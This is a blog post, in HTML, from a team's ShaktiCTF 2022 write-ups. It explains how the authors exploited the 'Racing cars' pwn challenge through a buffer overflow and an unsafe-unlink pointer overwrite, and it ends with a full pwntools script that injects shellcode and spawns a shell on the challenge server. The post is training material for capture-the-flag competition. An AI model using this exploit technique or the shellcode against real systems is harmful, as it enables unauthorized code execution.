<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>ShaktiCTF 2022 | Blog | bootplug</title><meta name=keywords content="pwn"><meta name=description content="Writeups from ShaktiCTF 2022, a CTF on the conference ShaktiCon (https://www.shakticon.com/) that focuses on inspiring, training and upskilling women in cybersecurity. We find their challenges cool, some clever and very good for training and understanding concepts. Thanks for your work! We played as Pwnrpuffgirls which we usually do if we team up as only women or non-binary people."><meta name=author content="maritio_o"><link rel=canonical href=https://bootplug.io/posts/ctf/shaktictf_22/><link crossorigin=anonymous href=/assets/css/stylesheet.min.6f60056d44d3f7eb69a4bc6c332b59960f3a995802bded244750232f33713c49.css integrity="sha256-b2AFbUTT9+tppLxsMytZlg86mVgCve0kR1AjLzNxPEk=" rel="preload stylesheet" as=style><link rel=preload href=/images/bootplug.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js integrity="sha256-uVus3DnjejMqn4g7Hni+Srwf3KK8HyZB9V4809q9TWE=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bootplug.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://bootplug.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bootplug.io/favicon-32x32.png><link rel=apple-touch-icon href=https://bootplug.io/apple-touch-icon.png><link rel=mask-icon href=https://bootplug.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.108.0"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="ShaktiCTF 2022"><meta property="og:description" content="Writeups from ShaktiCTF 2022, a CTF on the conference ShaktiCon (https://www.shakticon.com/) that focuses on inspiring, training and upskilling women in cybersecurity. We find their challenges cool, some clever and very good for training and understanding concepts. Thanks for your work! We played as Pwnrpuffgirls which we usually do if we team up as only women or non-binary people."><meta property="og:type" content="article"><meta property="og:url" content="https://bootplug.io/posts/ctf/shaktictf_22/"><meta property="og:image" content="https://bootplug.io/papermod-cover.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-12-10T17:04:13+01:00"><meta property="article:modified_time" content="2022-12-10T17:04:13+01:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bootplug.io/papermod-cover.png"><meta name=twitter:title content="ShaktiCTF 2022"><meta name=twitter:description content="Writeups from ShaktiCTF 2022, a CTF on the conference ShaktiCon (https://www.shakticon.com/) that focuses on inspiring, training and upskilling women in cybersecurity. We find their challenges cool, some clever and very good for training and understanding concepts. Thanks for your work! We played as Pwnrpuffgirls which we usually do if we team up as only women or non-binary people."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bootplug.io/posts/"},{"@type":"ListItem","position":2,"name":"CTFs","item":"https://bootplug.io/posts/ctf/"},{"@type":"ListItem","position":3,"name":"ShaktiCTF 2022","item":"https://bootplug.io/posts/ctf/shaktictf_22/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"ShaktiCTF 2022","name":"ShaktiCTF 2022","description":"Writeups from ShaktiCTF 2022, a CTF on the conference ShaktiCon (https://www.shakticon.com/) that focuses on inspiring, training and upskilling women in cybersecurity. We find their challenges cool, some clever and very good for training and understanding concepts. Thanks for your work! We played as Pwnrpuffgirls which we usually do if we team up as only women or non-binary people.","keywords":["pwn"],"articleBody":"pwn Racing cars Author: d1g174l_f0rtr355\nDescription: Welcome to the Incredibles! Win the race and get the flag!\nFor this challenge, we got first blood! Whoop whoop!\nWe are given a binary. When we run it, we are asked to first choose a car from the list, fill our name, occupation and address. It looks like this:\n➜ racing_cars ./racing_cars ================================== Welcome to the Incredibles ================================== To compete in the race you need to first buy a car! The price of each car is given below: 1. Lexus RC F GT3 (Emil Frey Racing):\t485470795 2. Porsche 911 RSR (991):\t1890391922 3. Mercedes-AMG GT3:\t1382811152 4. Toyota FT-1 Vision Gran Turismo:\t2058719150 5. Renault Sport R.S.01 GT3:\t1435867700 Choose your car: 1 Enter your details before you begin the race Name: maritio_o Occupation: foo Address: bar Sorry you lost the race! Try again later :) We started by reversing the binary, and it is was soon clear that a linked list was used to hold the information we input after choosing a car. This leads us to the unsafe-unlink vulnerability. There is no validation on the linked list element during unlink. Unlinking the middle element is done in the end of the main function.\nWhen choosing your car, 0x32 (50) bytes, of your choice is stored in a buffer that lies in the .bss memory region. It was a little suspicious, because if the area is not writeable and executable, this challenge could be quite tricky. We checked the permissions, and indeed the memory region was rwx. This means that we can put shellcode there!\nWe also found a buffer overflow vulnerability in the function reading input from stdin for name, occupation, and address. It allowed reading 0x100 (256) bytes of data into a buffer of size 0x20 within the linked list element. The linked list elements have the following structure:\nstruct __packed struct1 { int32_t idx; char buf[0x20]; struct struct1* next; struct struct1* prev; }; Another thing we noticed was that the very last thing that happens before the return of the main function is a call to a function pointer.\nHaving a rwx memory region we can write to, an unsafe-unlink and buffer overflow vulnerability, we can create a plan. The plan is to put shellcode into the .bss memory region, then use the buffer overflow to set fake next and previous elements into the middle list element. When the code unlinks the middle element, we manipulate the function pointer to point to the .bss memory region and our shellcode is run when the function pointer is called!\nThis sounds easy, but we left out a really tricky part… This is hella confusing. Thing is, the unlinking function does the following. It puts the current element’s next element into the previous’ next element. Oh lord… Just read the code below. Or google how linked lists and unlinking works. This is impossible to write well. Lol.\n{ l_struct-\u003eprev-\u003enext = l_struct-\u003enext; l_struct-\u003enext-\u003eprev = l_struct-\u003eprev; // this is the one we abuse } Since there is no validation during unlink, we can assign content to a memory address. To do this, we set the following structure to list element:\nstruct __packed struct1 { 0000\tint32_t idx; 0004\tchar buf[0x20]; 0024\tstruct struct1* next; // address to function pointer - offset to prev 0028\tstruct struct1* prev; // address to buffer in .bss }; The reason behind substracting the offset of prev in the fake next-element is that when unlinking, struct-\u003efake_next-\u003eprev points to the 0x28th byte in the fake next-element, but we want it to point to the beginning of the fake prev-element. Our fake next-element doesn’t even have a prev, it only contains the address to the function pointer.\nHope that was clear. Hehe.\nOkay, so how do we do this? I wrote these steps which are mirrored in my solution script:\nChoose car, but send shellcode that is less than 0x32 (50) bytes. If the shellcode is to long, the linked list element messes with it. Therefore, our shellcode which is run at the very end of the main function asks for more shellcode which is immediately executed (clever!) Send random input for Name and Occupation Use unsafe-unlink as described above as the input to Address because this one is in the middle of the linked list. The unsafe-unlink vulnerability does not work if one cannot change both the element before and after, also it is the only one that is unlinked When unlinking is done, the fake next-element which now is an address to our function pointer gets the content of our fake prev-element which contains the shellcode We don’t really need to do more, calling the function pointer is next in line in the code and our shellcode should run! Here is the solution script:\n#!/usr/bin/env python3 # -*- coding: utf-8 -*- # This exploit template was generated via: # $ pwn template --host 65.2.136.80 --port 32766 racing_cars from pwn import * # Set up pwntools for the correct architecture exe = context.binary = ELF('racing_cars') # Many built-in settings can be controlled on the command-line and show up # in \"args\". For example, to dump all data sent/received, and disable ASLR # for all created processes... # ./exploit.py DEBUG NOASLR # ./exploit.py GDB HOST=example.com PORT=4141 host = args.HOST or '65.2.136.80' port = int(args.PORT or 32766) def start_local(argv=[], *a, **kw): '''Execute the target binary locally''' if args.GDB: return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe.path] + argv, *a, **kw) def start_remote(argv=[], *a, **kw): '''Connect to the process on the remote host''' io = connect(host, port) if args.GDB: gdb.attach(io, gdbscript=gdbscript) return io def start(argv=[], *a, **kw): '''Start the exploit against the target.''' if args.LOCAL: return start_local(argv, *a, **kw) else: return start_remote(argv, *a, **kw) # Specify your GDB script here for debugging # GDB will be launched if the exploit is run via e.g. # ./exploit.py GDB gdbscript = ''' tbreak *0x{exe.entry:x} continue '''.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== # Arch: i386-32-little # RELRO: Partial RELRO # Stack: No canary found # NX: NX disabled # PIE: No PIE (0x8048000) # RWX: Has RWX segments addr_function_pointer = 0x804c044 addr_buf = 0x804c080 io = start() # .bss rwx memory # shellcode = p8(0xcc) # int3, breakpoint instruction to verify shellcode shellcode = asm(shellcraft.linux.read(0, addr_buf, 0x100)) io.sendlineafter(\"Choose your car: \", shellcode) # index 0 payload = \"Blip\" io.sendlineafter(\"Name: \", payload) # index 2 payload = \"Blop\" io.sendlineafter(\"Occupation: \", payload) # index 1 # overwrite with fake next and prev to assign the address of our shellcode # to the function pointer prev_offset = 0x28 next_element = addr_function_pointer - prev_offset prev_element = addr_buf # create linked list element payload = b\"A\" * 0x20 payload += p32(next_element) payload += p32(prev_element) io.sendlineafter(\"Address: \", payload) # shellcode in .bss asks for more shellcode time.sleep(0.5) shell = asm(shellcraft.sh()) io.sendline(p8(0x90) * 0x20 + shell) io.interactive() ","wordCount":"1138","inLanguage":"en","datePublished":"2022-12-10T17:04:13+01:00","dateModified":"2022-12-10T17:04:13+01:00","author":{"@type":"Person","name":"maritio_o"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bootplug.io/posts/ctf/shaktictf_22/"},"publisher":{"@type":"Organization","name":"Blog | bootplug","logo":{"@type":"ImageObject","url":"https://bootplug.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bootplug.io/ accesskey=h title="Blog (Alt + H)"><img src=/images/bootplug.png alt=logo aria-label=logo height=45>Blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://bootplug.io/archive title=Archive><span>Archive</span></a></li><li><a href=https://bootplug.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://bootplug.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://bootplug.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bootplug.io/>Home</a>&nbsp;»&nbsp;<a href=https://bootplug.io/posts/>Posts</a>&nbsp;»&nbsp;<a href=https://bootplug.io/posts/ctf/>CTFs</a></div><h1 class=post-title>ShaktiCTF 2022</h1><div class=post-description>Writeups from ShaktiCTF 2022, a CTF on the conference ShaktiCon (https://www.shakticon.com/) that focuses on inspiring, training and upskilling women in cybersecurity. We find their challenges cool, some clever and very good for training and understanding concepts. Thanks for your work! We played as Pwnrpuffgirls which we usually do if we team up as only women or non-binary people.</div><div class=post-meta>December 10, 2022&nbsp;·&nbsp;6 min&nbsp;·&nbsp;maritio_o</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#pwn aria-label=pwn>pwn</a><ul><li><a href=#racing-cars aria-label="Racing cars">Racing cars</a></li></ul></li></ul></div></details></div><div class=post-content><h1 id=pwn>pwn<a hidden class=anchor aria-hidden=true href=#pwn>#</a></h1><h2 id=racing-cars>Racing cars<a hidden class=anchor aria-hidden=true href=#racing-cars>#</a></h2><blockquote><p><strong>Author:</strong> d1g174l_f0rtr355</p><p><strong>Description:</strong>
Welcome to the Incredibles! Win the race and get the flag!</p></blockquote><hr><p>For this challenge, we got first blood! Whoop whoop!</p><p>We are given a binary. When we run it, we are asked to first choose a car from
the list, fill our name, occupation and address. It looks like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>➜  racing_cars ./racing_cars
</span></span><span style=display:flex><span><span style=color:#f92672>==================================</span>
</span></span><span style=display:flex><span>    Welcome to the Incredibles
</span></span><span style=display:flex><span><span style=color:#f92672>==================================</span>
</span></span><span style=display:flex><span>To compete in the race you need to first buy a car!
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The price of each car is given below:
</span></span><span style=display:flex><span>1. Lexus RC F GT3 <span style=color:#f92672>(</span>Emil Frey Racing<span style=color:#f92672>)</span>:	<span style=color:#ae81ff>485470795</span>
</span></span><span style=display:flex><span>2. Porsche <span style=color:#ae81ff>911</span> RSR <span style=color:#f92672>(</span>991<span style=color:#f92672>)</span>:				<span style=color:#ae81ff>1890391922</span>
</span></span><span style=display:flex><span>3. Mercedes-AMG GT3:					<span style=color:#ae81ff>1382811152</span>
</span></span><span style=display:flex><span>4. Toyota FT-1 Vision Gran Turismo:		<span style=color:#ae81ff>2058719150</span>
</span></span><span style=display:flex><span>5. Renault Sport R.S.01 GT3:			<span style=color:#ae81ff>1435867700</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Choose your car: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Enter your details before you begin the race
</span></span><span style=display:flex><span>Name: maritio_o
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Occupation: foo    
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Address: bar
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Sorry you lost the race! Try again later :<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>We started by reversing the binary, and it is was soon clear that a linked list
was used to hold the information we input after choosing a car. This leads us to
the <strong>unsafe-unlink vulnerability</strong>. There is no validation on the linked list
element during unlink. Unlinking the middle element is done in the end of the
main function.</p><p>When choosing your car, 0x32 (50) bytes, of your choice is stored in a buffer
that lies in the .bss memory region. It was a little suspicious, because if the
area is not writeable and executable, this challenge could be quite tricky. We
checked the permissions, and indeed the memory region was rwx. This means that
we can put shellcode there!</p><p>We also found a <strong>buffer overflow vulnerability</strong> in the function reading input
from stdin for name, occupation, and address. It allowed reading 0x100 (256)
bytes of data into a buffer of size 0x20 within the linked list element. The
linked list elements have the following structure:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> __packed struct1
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int32_t</span> idx;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>0x20</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> struct1<span style=color:#f92672>*</span> next;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> struct1<span style=color:#f92672>*</span> prev;
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>Another thing we noticed was that the very last thing that happens before the
return of the main function is a call to a function pointer.</p><p>Having a rwx memory region we can write to, an unsafe-unlink and buffer
overflow vulnerability, we can create a plan. The plan is to put shellcode into
the .bss memory region, then use the buffer overflow to set fake next and
previous elements into the middle list element. When the code unlinks the
middle element, we manipulate the function pointer to point to the .bss memory
region and our shellcode is run when the function pointer is called!</p><p>This sounds easy, but we left out a really tricky part&mldr; This is hella
confusing. Thing is, the unlinking function does the following. It puts the
current element&rsquo;s next element into the previous&rsquo; next element. Oh lord&mldr; Just
read the code below. Or google how linked lists and unlinking works. This is
impossible to write well. Lol.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>{
</span></span><span style=display:flex><span>	l_struct<span style=color:#f92672>-&gt;</span>prev<span style=color:#f92672>-&gt;</span>next <span style=color:#f92672>=</span> l_struct<span style=color:#f92672>-&gt;</span>next;
</span></span><span style=display:flex><span>	l_struct<span style=color:#f92672>-&gt;</span>next<span style=color:#f92672>-&gt;</span>prev <span style=color:#f92672>=</span> l_struct<span style=color:#f92672>-&gt;</span>prev;  <span style=color:#75715e>// this is the one we abuse
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>Since there is no validation during unlink, we can assign content to a memory
address. To do this, we set the following structure to list element:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> __packed struct1
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>0000</span>	<span style=color:#66d9ef>int32_t</span> idx;
</span></span><span style=display:flex><span><span style=color:#ae81ff>0004</span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>0x20</span>];
</span></span><span style=display:flex><span><span style=color:#ae81ff>0024</span>	<span style=color:#66d9ef>struct</span> struct1<span style=color:#f92672>*</span> next;  <span style=color:#75715e>// address to function pointer - offset to prev
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#ae81ff>002</span><span style=color:#ae81ff>8</span>	<span style=color:#66d9ef>struct</span> struct1<span style=color:#f92672>*</span> prev;  <span style=color:#75715e>// address to buffer in .bss
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	};
</span></span></code></pre></div><p>The reason behind substracting the offset of <code>prev</code> in the fake next-element is
that when unlinking, <code>struct->fake_next->prev</code> points to the 0x28th byte in the
fake next-element, but we want it to point to the beginning of the fake
prev-element. Our fake next-element doesn&rsquo;t even have a prev, it only contains
the address to the function pointer.</p><p>Hope that was clear. Hehe.</p><p>Okay, so how do we do this? I wrote these steps which are mirrored in my
solution script:</p><ol><li>Choose car, but send shellcode that is less than 0x32 (50) bytes. If the
shellcode is to long, the linked list element messes with it. Therefore, our
shellcode which is run at the very end of the main function asks for more
shellcode which is immediately executed (clever!)</li><li>Send random input for <code>Name</code> and <code>Occupation</code></li><li>Use unsafe-unlink as described above as the input to <code>Address</code> because this
one is in the middle of the linked list. The unsafe-unlink vulnerability
does not work if one cannot change both the element before and after, also
it is the only one that is unlinked</li><li>When unlinking is done, the fake next-element which now is an address to our
function pointer gets the content of our fake prev-element which contains
the shellcode</li><li>We don&rsquo;t really need to do more, calling the function pointer is next in
line in the code and our shellcode should run!</li></ol><p>Here is the solution script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># This exploit template was generated via:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># $ pwn template --host 65.2.136.80 --port 32766 racing_cars</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Set up pwntools for the correct architecture</span>
</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;racing_cars&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Many built-in settings can be controlled on the command-line and show up</span>
</span></span><span style=display:flex><span><span style=color:#75715e># in &#34;args&#34;.  For example, to dump all data sent/received, and disable ASLR</span>
</span></span><span style=display:flex><span><span style=color:#75715e># for all created processes...</span>
</span></span><span style=display:flex><span><span style=color:#75715e># ./exploit.py DEBUG NOASLR</span>
</span></span><span style=display:flex><span><span style=color:#75715e># ./exploit.py GDB HOST=example.com PORT=4141</span>
</span></span><span style=display:flex><span>host <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>HOST <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;65.2.136.80&#39;</span>
</span></span><span style=display:flex><span>port <span style=color:#f92672>=</span> int(args<span style=color:#f92672>.</span>PORT <span style=color:#f92672>or</span> <span style=color:#ae81ff>32766</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>start_local</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>GDB:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> gdb<span style=color:#f92672>.</span>debug([exe<span style=color:#f92672>.</span>path] <span style=color:#f92672>+</span> argv, gdbscript<span style=color:#f92672>=</span>gdbscript, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> process([exe<span style=color:#f92672>.</span>path] <span style=color:#f92672>+</span> argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>start_remote</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    io <span style=color:#f92672>=</span> connect(host, port)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>GDB:
</span></span><span style=display:flex><span>        gdb<span style=color:#f92672>.</span>attach(io, gdbscript<span style=color:#f92672>=</span>gdbscript)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> io
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>start</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> start_local(argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> start_remote(argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Specify your GDB script here for debugging</span>
</span></span><span style=display:flex><span><span style=color:#75715e># GDB will be launched if the exploit is run via e.g.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># ./exploit.py GDB</span>
</span></span><span style=display:flex><span>gdbscript <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>tbreak *0x</span><span style=color:#e6db74>{exe.entry:x}</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>continue
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span><span style=color:#f92672>.</span>format(<span style=color:#f92672>**</span>locals())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#===========================================================</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#                    EXPLOIT GOES HERE</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#===========================================================</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Arch:     i386-32-little</span>
</span></span><span style=display:flex><span><span style=color:#75715e># RELRO:    Partial RELRO</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Stack:    No canary found</span>
</span></span><span style=display:flex><span><span style=color:#75715e># NX:       NX disabled</span>
</span></span><span style=display:flex><span><span style=color:#75715e># PIE:      No PIE (0x8048000)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># RWX:      Has RWX segments</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>addr_function_pointer <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x804c044</span>
</span></span><span style=display:flex><span>addr_buf <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x804c080</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> start()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># .bss rwx memory</span>
</span></span><span style=display:flex><span><span style=color:#75715e># shellcode = p8(0xcc)  # int3, breakpoint instruction to verify shellcode</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>=</span> asm(shellcraft<span style=color:#f92672>.</span>linux<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>0</span>, addr_buf, <span style=color:#ae81ff>0x100</span>)) 
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Choose your car: &#34;</span>, shellcode)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># index 0</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Blip&#34;</span>
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Name: &#34;</span>, payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># index 2</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Blop&#34;</span>
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Occupation: &#34;</span>, payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># index 1</span>
</span></span><span style=display:flex><span><span style=color:#75715e># overwrite with fake next and prev to assign the address of our shellcode</span>
</span></span><span style=display:flex><span><span style=color:#75715e># to the function pointer</span>
</span></span><span style=display:flex><span>prev_offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x28</span>
</span></span><span style=display:flex><span>next_element <span style=color:#f92672>=</span> addr_function_pointer <span style=color:#f92672>-</span> prev_offset  
</span></span><span style=display:flex><span>prev_element <span style=color:#f92672>=</span> addr_buf
</span></span><span style=display:flex><span><span style=color:#75715e># create linked list element</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x20</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p32(next_element) 
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p32(prev_element)
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Address: &#34;</span>, payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># shellcode in .bss asks for more shellcode</span>
</span></span><span style=display:flex><span>time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>0.5</span>)
</span></span><span style=display:flex><span>shell <span style=color:#f92672>=</span> asm(shellcraft<span style=color:#f92672>.</span>sh())
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendline(p8(<span style=color:#ae81ff>0x90</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x20</span> <span style=color:#f92672>+</span> shell)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>interactive()
